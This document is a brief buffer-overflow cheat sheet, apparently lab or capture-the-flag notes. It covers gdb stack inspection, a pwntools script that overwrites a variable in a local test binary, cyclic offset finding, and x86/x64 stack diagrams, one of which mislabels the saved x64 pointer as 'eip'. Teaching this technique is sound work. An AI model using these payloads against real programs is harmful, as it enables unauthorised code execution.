# Buffer Overflow

# Variable Overwrite
Identifying offset to overwrite variable

Listing Stack
By listing stack we can identify where our input is (for example `0x41414141`).
```
x/100xw $esp
x/100xg $rsp
```

Examining Base Pointer and Variable to Overwrite
```
x/xw $ebp
x/xg $rbp

x/xw $ebp-0xc
x/xg $rbp-0xc
```
We can find the printed address on the stack.

Creting exploit
```
from pwn import *

elf = context.binary = ELF("./vuln", checksec=False)
p = process(["./vuln"])

payload = b"A" * 32 # set offset here
payload += p32(0xdeadbeef) #p64() for x64

p.sendline(payload)
p.interactive()
```


# Return Pointer(EIP/RIP) Overwrite with Parameters

Locating offset to reach the return pointer
```
cyclic 100
cyclic -l faaa
```
or you can choose the method used in variable overwrite

For x86
```
+----------------------------+
|      second parameter      |
+----------------------------+
|      first parameter       |
+----------------------------+
|      stored eip value      |
+----------------------------+
|      stored ebp value      |
+----------------------------+
|AAAAAAAAAAAAAAAAAAAAAAAAAAAA|
+----------------------------+
```

For x64
```
+----------------------------+
|      stored eip value      |
+----------------------------+
|      stored ebp value      |
+----------------------------+
|AAAAAAAAAAAAAAAAAAAAAAAAAAAA|
+----------------------------+
```








